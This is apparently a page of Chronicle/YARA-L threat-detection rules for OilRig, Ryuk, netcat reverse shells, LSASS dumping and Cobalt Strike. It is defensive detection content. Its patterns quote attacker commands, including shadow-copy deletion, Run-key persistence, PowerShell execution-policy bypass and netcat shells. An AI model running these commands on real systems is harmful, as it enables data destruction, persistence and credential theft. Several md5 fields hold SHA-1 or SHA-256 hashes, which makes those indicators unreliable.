<li><a href="#">rule north_korean_tunneling_tool__electricfish_detection_ar19129a { meta: author = "Roman Ranskyi" description = "The malware implements a custom protocol that allows traffic to be funneled between a source and a destination Internet Protocol (IP) address. The malware continuously attempts to reach out to the source and the designation system, which allows either side to initiate a funneling session. License: ." reference = "" version = "0.01" created = "2019/05/14" product = "windows" service = "sysmon" mitre = "Exfiltration, Command and Control, t1179, t1002, t1090" events: (($selection_hashes.metadata.product_event_type = "1" and ($selection_hashes.target.file.md5 = "08bb17d8e839e7fc92426e813a696e73" or $selection_hashes.target.file.md5 = "0939363ff55d914e92635e5f693099fb28047602" or $selection_hashes.target.file.md5 = "3549cfa19e60aa9239f79d80e19279fa" or $selection_hashes.target.file.md5 = "382715f8e776a544bf70f843a52e3ff2" or $selection_hashes.target.file.md5 = "3d3d7962d16652002018640a3fa27d44" or $selection_hashes.target.file.md5 = "5d25465ec4d51c6b61947990fb148d0b1ee8a344069d5ac956ef4ea6a61af879" or $selection_hashes.target.file.md5 = "6c3daca3c522ab98a8ac12a45087297c" or $selection_hashes.target.file.md5 = "7efe8a7ad9c6a6146bddd5aef9ceba477ca6973203a41f4b7f823095a90cb10f" or $selection_hashes.target.file.md5 = "871fb8486e5ea3307ff7b65ddf46518a" or $selection_hashes.target.file.md5 = "8d9123cd2648020292b5c35edc9ae22e" or $selection_hashes.target.file.md5 = "a1260fd3e9221d1bc5b9ece6e7a5a98669c79e124453f2ac58625085759ed3bb" or $selection_hashes.target.file.md5 = "a3a1a43f0e631c10ab42e5404b61580e760e7d6f849ab8eb5848057a8c60cda2" or $selection_hashes.target.file.md5 = "b7f382ea7e6c9c8e737cb92551341e64")) or (re.regex($selection_hashes.target.process.command_line, `.*\.exe`) and $selection_hashes.target.process.command_line = "-s" and $selection_hashes.target.process.command_line = "-d" and $selection_hashes.target.process.command_line = "-p" and $selection_hashes.target.process.command_line = "-u" and $selection_hashes.target.process.command_line = "-pw")) condition: $selection_hashes 
<li><a href="#">rule notepadexe_dll_search_order_hijackingsysmon { meta: author = "Den Iuzvyk" description = "notepad++.exe DLL search order hijacking License: ." reference = "" version = "0.01" created = "2021-03-09" category = "sysmon" product = "windows" mitre = "persistence, defense_evasion, t1073, t1038" events: (($selection.metadata.product_event_type = "7" and re.regex($selection.target.process.file.full_path, `.*notepad\+\+\.exe`) and re.regex($selection.target.process.file.full_path, `.*dbghelp\.dll`)) and not (re.regex($selection.target.process.file.full_path, `.*Windows\\System32.*`))) condition: $selection 
<li><a href="#">rule offensive_tool_maliciousdllgenerator_dll_side_loadingsysmon { meta: author = "Den Iuzvyk" description = "Detects winword.exe and UserAccountControlSettings.exe dll side loading attack. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "sysmon" product = "windows" mitre = "persistence, defense_evasion, t1073, t1038" events: ((($selection_uacs.metadata.product_event_type = "7" and re.regex($selection_uacs.target.process.file.full_path, `.*UserAccountControlSettings\.exe`) and re.regex($selection_uacs.target.process.file.full_path, `.*cryptbase\.dll`)) and not (re.regex($selection_uacs.target.process.file.full_path, `.*Windows\\System32.*`))) or (($selection_uacs.metadata.product_event_type = "7" and re.regex($selection_uacs.target.process.file.full_path, `.*winword\.exe`) and re.regex($selection_uacs.target.process.file.full_path, `.*oart\.dll`)) and not (re.regex($selection_uacs.target.process.file.full_path, `.*Program Files.*\\Microsoft Office\\root\\Office16\\.*`)))) condition: $selection_uacs 
<li><a href="#">rule office_applications_suspicious_process_activity { meta: author = "Osman Demir" description = "Detects office applications suspicious process activity License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" events: ($selection.metadata.product_event_type = "1" and ($selection.src.process.file.full_path = "excel.exe" or $selection.src.process.file.full_path = "msaccess.exe" or $selection.src.process.file.full_path = "outlook.exe" or $selection.src.process.file.full_path = "powerpnt.exe" or $selection.src.process.file.full_path = "winword.exe") and ($selection.target.process.file.full_path = "powershell.exe" or $selection.target.process.file.full_path = "cmd.exe")) condition: $selection 
<li><a href="#">rule office_macro_starts_cmd { meta: author = "Florian Roth" description = "Detects a Windows command line executable started from Microsoft Word or Excel License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" events: ($selection.metadata.product_event_type = "1" and (re.regex($selection.src.process.file.full_path, `.*\\WINWORD\.EXE`) or re.regex($selection.src.process.file.full_path, `.*\\EXCEL\.EXE`)) and re.regex($selection.target.process.file.full_path, `.*\\cmd\.exe`)) condition: $selection 
<li><a href="#">rule office_starup_folder_persistance { meta: author = "Den Iuzvyk" description = "Detects persistance via saving dll with extension .wll to office startup folder. Used by Chinese APT in recent COVID campaign. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, t1137" events: ($selection.metadata.product_event_type = "11" and re.regex($selection.target.process.file.full_path, `.*EQNEDT32\.EXE`) and re.regex($selection.target.file.full_path, `.*\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\.*\.wll`)) condition: $selection 
<li><a href="#">rule oilirgs_rdat_backdoor_sysmon_detection { meta: author = "Ariel Millahuel" description = "RDAT its a backdoor that belongs to OilRig License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "command_and_control, T1105" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\Desktop\\dns\\client\\x64\\Release\\client\.pdb.*`) or re.regex($selection1.target.file.full_path, `.*\\RDAT\\client\\x64\\Release\\client\.pdb.*`) or re.regex($selection1.target.file.full_path, `.*\\Programdata\\Nt\.dat.*`))) condition: $selection1 
<li><a href="#">rule oilrig { meta: author = "Ariel Millahuel" description = "OilRig is an Iranian threat group operating primarily in the Middle East by targeting organizations in this region that are in a variety of different industries; however, this group has occasionally targeted organizations outside of the Middle East as well. It also appears OilRig carries out supply chain attacks, where the threat group leverages the trust relationship between organizations to attack their primary targets. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, persistence, privilege_escalation, T1059, T1053" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*nsExec\.dll.*`) or re.regex($selection1.target.file.full_path, `.*nseEBFB\.tmp.*`) or re.regex($selection1.target.file.full_path, `.*chkSrv\.vbs.*`) or re.regex($selection1.target.file.full_path, `.*SCSCAN\.xml.*`) or re.regex($selection1.target.file.full_path, `.*AnyDesk\.exe.*`))) condition: $selection1 
<li><a href="#">rule oilrig_helminth_sysmon_behavior_historic_indicators { meta: author = "Lee Archinal" description = "This content detects characteristics of an OilRig executable Helminth as seen in a malware lab. License: ." reference = "" version = "0.01" created = "2019/01/11" product = "windows" service = "sysmon" mitre = "persistence, t1053, execution, t1059" events: ($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\JuniperSetupClientInstaller.msi" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\9A189DFE\\C7B7C186" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\9A189DFE" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\6908B9F2\\6A98A6DF" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\6908B9F2" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\6908B9F2\\6A98A6DF\\JuniperSetupClientInstaller.exe" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\JuniperSetupClientInstaller.exe" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\mMSI.dll" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\OFFLINE\\mMSI.dll\\mMSIExec.dll" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\mia.lib" or $selection1.target.file.full_path = "C:\\ProgramData\\mia4354.tmp\\JuniperSetupClientInstaller.res" or $selection1.target.file.full_path = "AppData\\Roaming\\Microsoft Temperary" or $selection1.target.file.full_path = "AppData\\Roaming\\Microsoft Temperary\\adbmanager.exe" or $selection1.target.file.full_path = "AppData\\Local\\Temp\\acro" or $selection1.target.file.full_path = "AppData\\Roaming\\Microsoft Temperary\\adbtray.exe" or $selection1.target.file.full_path = "AppData\\Local\\Temp\\acro\\Users" or $selection1.target.file.full_path = "AppData\\Local\\Temp\\acro\\Users\\in" or $selection1.target.file.full_path = "C:\\Users\\Public\\Libraries\\~Windows\\wintrust.hlm" or $selection1.target.file.full_path = "C:\\Users\\Public\\Libraries\\~Windows" or $selection1.target.file.full_path = "AppData\\Local\\Temp\\acro\\Users\\config.txt" or $selection1.target.file.full_path = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Certificate.ico" or $selection1.target.file.full_path = "AppData\\Roaming\\Microsoft Temperary\\Certificate Managment.lnk" or $selection1.target.file.full_path = "")) condition: $selection1 
<li><a href="#">rule oilrig_neuron_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristics of the executable used by the APT known as OilRIg dubed Neuron. License: ." reference = "" version = "0.01" created = "2019/01/24" product = "windows" service = "sysmon" mitre = "execution, t1059" events: ((($selection1.metadata.product_event_type = "11" and ($selection1.target.file.full_path = "C:\\ProgramData\\Mozilla\\updates\\Mozilla-x86-ui.exe" or $selection1.target.file.full_path = "C:\\ProgramData\\Mozilla\\updates\\System.Web.Helpers.dll")) or ($selection1.metadata.product_event_type = "13" and ($selection1.target.registry.registry_key = "HKLM\\System\\CurrentControlSet\\Control\\Windows\\EnvironmentAdditionalSet" or re.regex($selection1.target.registry.registry_key, `HKLM\\SOFTWARE\\Mozilla\\Input\\Locales\\loc_3c01\\InputMethods\\1.*`) or $selection1.target.registry.registry_key = "HKLM\\System\\CurrentControlSet\\Control\\Windows\\EnvironmentAdditionalSet"))) or ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "FonDUE.EXE")) condition: $selection1 
<li><a href="#">rule oilrig_part_1 { meta: author = "Ariel Millahuel" description = "OilRig is an Iranian threat group operating primarily in the Middle East by targeting organizations in this region that are in a variety of different industries; however, this group has occasionally targeted organizations outside of the Middle East as well. It also appears OilRig carries out supply chain attacks, where the threat group leverages the trust relationship between organizations to attack their primary targets. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, persistence, privilege_escalation, T1059, T1053" events: (($selection2.target.process.command_line = "cmd.exe\" /c wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List" or $selection2.target.process.command_line = "schtasks.exe /create /F /tn \"SC Scheduled Scan\" /xml \"C:\\Users\\admin\\AppData\\Local\\Microsoft\\Taskbar\\SCSCAN.xml" or $selection2.target.process.command_line = "ipconfig /flushdns" or re.regex($selection2.target.process.command_line, `cmd\.exe /c copy \"C:\\Users\\admin\\AppData\\Local\\Temp.*\.doc\" \"C:\\Users\\admin\\AppData\\Roaming\\Tmp\.doc`) or re.regex($selection2.target.process.command_line, `cmd\.exe /c SchTasks /Create /SC MINUTE /MO 3 /TN \"InetlSecurityAssistManager\" /TR \"C:\\Users\\admin\\AppData\\Local\\Temp.*\.exe\" /f`) or $selection2.target.process.command_line = "cmd.exe\" /c start /b schtasks /query /fo csv" or $selection2.target.process.command_line = "powershell.exe\" -exec bypass -File C:\\programdata\\Office365DCOMCheck.ps1") and ($selection2.metadata.product_event_type = "4688" or $selection2.metadata.product_event_type = "1")) condition: $selection2 
<li><a href="#">rule ole_controls_registered_via_regsvr32exe_sysmon_behavior { meta: author = "Lee Archinal" description = "Regsvr32.exe is a command-line program used to register and unregister OLE controls License: ." reference = "" version = "0.01" created = "2019/07/06" product = "windows" service = "sysmon" mitre = "defense_evasion, execution, t1117" events: ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\system32\\regsvr32.exe" and re.regex($selection1.target.process.command_line, `regsvr32\.exe /s /u /i:.* .*\.dll`) and $selection1.src.process.file.full_path = "C:\\Windows\\System32\\cmd.exe") condition: $selection1 
<li><a href="#">rule olympic_destroyer_detector { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Olympic Destroyer Detector. License: ." reference = "" version = "0.01" created = "2018/06/19" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1112, Execution, t1204" events: (($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "9bc365a16c63f25dfddcbe11da042974" or $selection.target.file.md5 = "da93e6651c5ba3e3e96f4ae2dd763d94" or $selection.target.file.md5 = "6ccd8133f250d4babefbd66b898739b9" or $selection.target.file.md5 = "abe771f280cdea6e7eaf19a26b1a9488" or $selection.target.file.md5 = "b60da65b8d3627a89481efb23d59713a" or $selection.target.file.md5 = "b94bdb63f0703d32c20f4b2e5500dbbe" or $selection.target.file.md5 = "bb5e8733a940fedfb1ef6b0e0ec3635c" or $selection.target.file.md5 = "97ddc336d7d92b7db17d098ec2ee6092" or $selection.target.file.md5 = "1d0cf431e623b21aeae8f2b8414d2a73" or $selection.target.file.md5 = "0e7b32d23fbd6d62a593c234bafa2311" or $selection.target.file.md5 = "e2e102291d259f054625cc85318b7ef5" or $selection.target.file.md5 = "0c6ddc3a722b865cc2d1185e27cef9b8" or $selection.target.file.md5 = "54b06b05b6b92a8f2ff02fdf47baad0e" or $selection.target.file.md5 = "4247901eca6d87f5f3af7df8249ea825")) or ($selection.metadata.product_event_type = "13" and (re.regex($selection.target.registry.registry_key, `.*\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockLogging`) or re.regex($selection.target.registry.registry_key, `.*\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\EnableScriptBlockInvocationLogging`)) and $selection.metadata.description = "0" and $selection.metadata.event_type = "SetValue")) condition: $selection 
<li><a href="#">rule oracle_weblogic_exploit { meta: author = "Florian Roth" description = "Detects access to a webshell droped into a keytore folder on the WebLogic server License: ." reference = "" version = "0.01" created = "2018/07/22" category = "webserver" mitre = "t1100, t1190, initial_access, persistence, privilege_escalation, cve.2018-2894" events: re.regex($selection.target.url, `.*/config/keystore/.*\.js.*`) condition: $selection 
<li><a href="#">rule password_dumper_activity_on_lsass { meta: author = "None" description = "Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "credential_access, t1003" events: ($selection.metadata.product_event_type = "4656" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\lsass.exe" and $selection.target.process.access_mask = "0x705" and $selection.src.user.user_display_name = "SAM_DOMAIN") condition: $selection 
<li><a href="#">rule password_dumper_remote_thread_in_lsass { meta: author = "Thomas Patzke" description = "Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundrets of events. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" events: ($selection.metadata.product_event_type = "8" and $selection.target.process.file.full_path = "C:\\Windows\\System32\\lsass.exe" and $selection.src.application = "") condition: $selection 
<li><a href="#">rule password_stealer_pwdfetcher_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = ". License: ." reference = "" version = "0.01" created = "2018/06/01" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "2A5C9D4DAE5E53B2962FBE2B7FA8798A127BC9A6" or $selection.target.file.md5 = "9B1586766AF9885EF960F05F8606D1230B36AC15" or $selection.target.file.md5 = "A2F0D5AF81D93752CFF1CF1E8BB9E6CAEE6D1B5E" or $selection.target.file.md5 = "CE18467B33161E39C36FC6C5B52F68D49ABCFC2A")) condition: $selection 
<li><a href="#">rule pax_dism_wim_mount_via_cmdline { meta: author = "SOC Prime Team, Fireeye" description = "Identifies dism processes consistent with the arguments used by the tool PXE and Loot (PAX). License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1552, t1552.001" events: (re.regex($selection.target.process.command_line, `.*WimFile.*`) and re.regex($selection.target.process.command_line, `.*MountDir.*`) and re.regex($selection.target.process.command_line, `.*LogPath.*`) and re.regex($selection.target.process.command_line, `.*index.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule paymen45_ransomware { meta: author = "Osman Demir" description = "Detects Paymen45 Ransomware License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1486, Impact" events: (($selection.metadata.product_event_type = "1" and $selection.src.process.file.full_path = "Paymen45.exe" and $selection.target.process.file.full_path = "C:\\Windows\\system32\\vssadmin.exe" and $selection.target.process.command_line = "vssadmin delete shadows /all /quiet") or ($selection.metadata.product_event_type = "11" and $selection.target.process.file.full_path = "Paymen45.exe" and ($selection.target.file.full_path = "C:\\Users\\admin\\AppData\\Local\\VirtualStore\\Program Files\\Adobe\\Acrobat Reader DC\\Esl eadme.txt" or $selection.target.file.full_path = "C:\\Users\\admin\\Desktop eadme.txt")) or ($selection.target.file.md5 = "4b12f4fdf07d06fb59b5619d01a293c51d32efd183d45a87459b47d5169cfe51" or $selection.target.file.md5 = "f9dc9848892b3c1ca620a7a69cce4ff5bbf03cdfd0ad12f348973ea76d4d125e")) condition: $selection 
<li><a href="#">rule persistence_of_ryuk_ransomware { meta: author = "Emir Erdogan" description = "Ryuk has been know to be a part of a bigger \"Triple Threat\" attack that involves Emotet and TrickBot. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1055, T1060, T1112, T1012, T1486" events: (re.regex($selection1.target.process.file.full_path, `.*\\reg\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\cmd\.exe`) and (re.regex($selection1.target.process.command_line, `REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t REG_SZ /d \".*\\BPWPc\.exe\" /f`) or re.regex($selection1.target.process.command_line, `REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t REG_SZ /d \".*\\YLZHK\.exe\" /f`) or re.regex($selection1.target.process.command_line, `REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchos\" /t REG_SZ /d \".*\\rojwa\.exe\" /f`)) and ($selection1.target.process.command_line = "vssadmin Delete Shadows /all /quiet" or re.regex($selection1.target.process.command_line, `vssadmin resize shadowstorage.*.*`))) condition: $selection1 
<li><a href="#">rule phishing_campaign_using_zoom_invites { meta: author = "Osman Demir" description = "A new phishing campaign started that acts as a Zoom video conference invitation to obtain Microsoft credentials from users. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "T1192, initial_access" events: ($selection.security_result.action = "allowed" and ($selection.target.url = "[@]company.com" or $selection.target.url = "" or $selection.target.url = "")) condition: $selection 
<li><a href="#">rule phorpiex_malware_detector_sysmon_behavior_august_2019 { meta: author = "Lee Archinal" description = "This content detects characteristics of the Phorpiex malware strain as reported by Talos License: ." reference = "" version = "0.01" created = "2019/08/16" product = "windows" service = "sysmon" mitre = "defense_evasion, persistence, t1060, t1112" events: ((($selection1.metadata.product_event_type = "13" and (($selection1.target.registry.registry_key = "HKLM\\SYSTEM\\CONTROLSET001\\SERVICES\\SHAREDACCESS\\PARAMETERS\\FIREWALLPOLICY\\STANDARDPROFILE\\AUTHORIZEDAPPLICATIONS\\LIST" and $selection1.metadata.description = "C:\\Windows\\M-5050402520507690204050\\winmgr.exe") or (($selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN") and $selection1.metadata.description = "Microsoft Windows Manager"))) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\Secret\.exe`) or re.regex($selection1.target.file.full_path, `.*\\Documents\.exe`) or re.regex($selection1.target.file.full_path, `.*\\Pictures\.exe`) or re.regex($selection1.target.file.full_path, `.*\\505050\.exe`) or re.regex($selection1.target.file.full_path, `.*\\Movies\.exe`) or re.regex($selection1.target.file.full_path, `.*\\Private\.exe`) or re.regex($selection1.target.file.full_path, `.*\\windrv\.exe`) or re.regex($selection1.target.file.full_path, `C:\\Users.*\\AppData\\Roaming\\winmgr\.txt`) or $selection1.target.file.full_path = "E:\\autorun.inf" or $selection1.target.file.full_path = "D:\\autorun.inf" or $selection1.target.file.full_path = "C:\\Windows\\M-5050402520507690204050" or $selection1.target.file.full_path = "C:\\Windows\\M-5050402520507690204050\\winmgr.exe"))) or ($selection1.metadata.product_event_type = "1" and ($selection1.target.process.file.full_path = "C:\\Windows\\M-5050402520507690204050\\winmgr.exe" or re.regex($selection1.target.process.file.full_path, `.*\\Secret\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\Documents\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\Pictures\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\505050\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\Movies\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\Private\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\windrv\.exe`)))) condition: $selection1 
<li><a href="#">rule poetrat_pythonrat_uses_covid19_lure { meta: author = "Emir Erdogan" description = "Covid19 theme phishing document drop pyhton and execute malware by python License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1059, T1012, T1086" events: (re.regex($selection1.src.process.file.full_path, `.*\\WINWORD\.exe`) and (re.regex($selection1.target.process.file.full_path, `.*\\cmd\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\powershell\.exe`)) and (re.regex($selection1.target.process.command_line, `.*/c copy .*.*\.docx .*\.rar && \"C:\\Program Files\\WinRAR\\winRar\.exe\" x -o\+ -ibck .*\.rar .*\.bat && start /b .*\.bat .*\.EXE MICROSOFT WORD`) or re.regex($selection1.target.process.command_line, `C:\\Programs\\Microsoft\\Office\\MSWord\.exe\\\.\.\\\.\.\\\.\.\\\.\..*\\powershell\.exe copy .*.*\.docx .*\.rar; & .*\\WinRAR\.exe x -ibck .*\.rar .*\.exe;Start-Sleep 5;start .*\.EXE MSW`))) condition: $selection1 
<li><a href="#">rule pony_malware_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Pony Malware Detector. License: ." reference = "" version = "0.01" created = "2019/01/25" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "2fdc22d8926db1b04dc3d62ff6da72236cb1c052b23553b644c7f18ea8496d8a" or $selection.target.file.md5 = "6bfa353f905c0fc5ded87e7f35dc939e7b757ea3f2f8372f81f0ac40edadd619" or $selection.target.file.md5 = "3f5240c924074995651c4ccac15ddfd0070beff93625dcea9db118ab32bad61d" or $selection.target.file.md5 = "3cfd8919f095e048e0f24a41c2f132328f0d0efe19581b308d9d2d3ffad40c29" or $selection.target.file.md5 = "36baccd2a4fc4f683c839283123a75de61b01ce93205f4a34975263e9c66aaed" or $selection.target.file.md5 = "42d0990daba69fa5068a6910d0eac487f3d308ce7e28799a959dace8d84125d7" or $selection.target.file.md5 = "d214c89af1929af1171ac40999b14a4f6fbcfd13b88cade392853a2c61057122" or $selection.target.file.md5 = "c7ef89222d760fc915690e6394c61c84176e618f7c9508beca30aa9a0f1b1991" or $selection.target.file.md5 = "2c79954335b579309957c22b1b7976359fd067691626f8beb99779143edaa69" or $selection.target.file.md5 = "82d4b6676bbff17626aba1a65a9c6ec10ab036c101c8dc5e6e697693ec5a013f" or $selection.target.file.md5 = "5c46fb082a683144092793529a0d10b6")) condition: $selection 
<li><a href="#">rule possible_abusing_ads { meta: author = "Roman Ranskyi" description = "After translation, DELETE delete double quotes in search (ELK or Graylog)! Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. License: ." reference = "" version = "0.01" created = "2019/05/27" product = "windows" service = "sysmon" mitre = "defense_evasion, t1096" events: (re.regex($selection0.target.process.file.full_path, `.*:.*`) or re.regex($selection0.src.process.file.full_path, `.*:.*`)) condition: $selection0 
<li><a href="#">rule possible_anything_cpl_or_anything_dll_hijack__via_imageload { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects anything.cpl being loaded by any process. License: ." reference = "['(Methodology).ioc', '(Methodology).ioc', '']" version = "0.01" created = "2020-12-10" events: (re.regex($event.target.process.file.full_path, `anything.cpl`) or re.regex($event.target.process.file.full_path, `anything.dll`)) condition: $event 
<li><a href="#">rule possible_applocker_bypass { meta: author = "juju4" description = "Detects execution of executables that can be used to bypass Applocker whitelisting License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, t1118, t1121, t1127, t1170" events: ((re.regex($selection.target.process.command_line, `.*\\msdt\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\installutil\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\regsvcs\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\regasm\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\msbuild\.exe.*`) or re.regex($selection.target.process.command_line, `.*\\ieexec\.exe.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_bind_or_reverse_shell_via_netcat_auditbeat_for_linux { meta: author = "Roman Ranskyi" description = "Detects possible bind or reverse shell via \"classic\" netcat tool. For rule usage, you must be install auditbeat. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "linux" service = "auditbeat" mitre = "Command And Control, t1008, Execution, t1059, t1072" events: (($netcat_shell.target.process.command_line = "netcat" or $netcat_shell.target.process.command_line = "nc") and (($netcat_shell.network.direction = "listening" or $netcat_shell.network.direction = "outbound" or $netcat_shell.network.direction = "outgoing") or ($netcat_shell.target.process.command_line = "-e" or $netcat_shell.target.process.command_line = "/bin/bash" or $netcat_shell.target.process.command_line = "/bin/sh" or $netcat_shell.target.process.command_line = "-nv"))) condition: $netcat_shell 
<li><a href="#">rule possible_cc_traffic_from_malware_variants { meta: author = "Joseph Kamau" description = "This rule can be used to hunt for command and control traffic in proxy logs, the rule can help detect the presence of malware variants e.g zeus, pony, Buer Loader, Emotet wifi spreader,Kpot, Dridex,smoke loader, hancitor which have used the same naming convention for there C&C scripts License: ." reference = "" version = "0.01" created = "2021-03-09" product = "proxy" mitre = "command&control, t1043" events: re.regex($selection.target.url, `.*/gate\.php`) condition: $selection 
<li><a href="#">rule possible_cobaltstrike_psexec_filenames_via_audit { meta: author = "SOC Prime Team" description = "CobaltStrike uses a executables with 7 random alphanumeric characters by default (i.e. 28a3fe2.exe) License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "t1035, t1077, lateral_movement, execution" events: ((re.regex($logsource.target.process.command_line, `\..*\\\\[A-Za-z0-9]{7}\\\.[Ee][Xx][Ee]`) and re.regex($logsource.target.process.command_line, `\..*\\\\\..*[0-9]\..*\\\.[Ee][Xx][Ee]`) and $logsource.metadata.product_event_type = "4697") and not (re.regex($logsource.target.process.command_line, `\..*64\\\.[Ee][Xx][Ee]`))) condition: $logsource 
<li><a href="#">rule possible_cobaltstrike_psexec_filenames_via_audit_part_1 { meta: author = "SOC Prime Team" description = "CobaltStrike uses a executables with 7 random alphanumeric characters by default (i.e. 28a3fe2.exe) License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "system" mitre = "t1035, t1077, lateral_movement, execution" events: ((re.regex($logsource.target.process.command_line, `\..*\\\\[A-Za-z0-9]{7}\\\.[Ee][Xx][Ee]`) and re.regex($logsource.target.process.command_line, `\..*\\\\\..*[0-9]\..*\\\.[Ee][Xx][Ee]`) and $logsource.metadata.product_event_type = "7045") and not (re.regex($logsource.target.process.command_line, `\..*64\\\.[Ee][Xx][Ee]`))) condition: $logsource 
<li><a href="#">rule possible_credential_in_files_execution_sysmon_behavior { meta: author = "Lee Archinal (content) Aric Gady (threat emulator)" description = "This content detects powershell users trying to discover credentials in Files (Based off of SOCPrime Red Tests) License: ." reference = "" version = "0.01" created = "2019/06/30" product = "windows" service = "sysmon" mitre = "credential_access, t1081" events: ($selection1.metadata.product_event_type = "1" and $selection1.target.process.file.full_path = "C:\\Windows\\System32\\findstr.exe" and (re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\findstr\.exe -si pass.*`) or re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\findstr\.exe -si user.*`)) and $selection1.src.process.file.full_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") condition: $selection1 
<li><a href="#">rule possible_data_exfiltration_via_smtp { meta: author = "Joseph Kamau" description = "This rule detects when a process initiates an smtp connection, most keylogger variant use smtp to exfiltrate the keystrokes collected..eg hawkeye, agent tesla License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "exfiltration, t1048" events: ($selection.metadata.product_event_type = "3" and ($selection.target.port = "587" or $selection.target.port = "465")) condition: $selection 
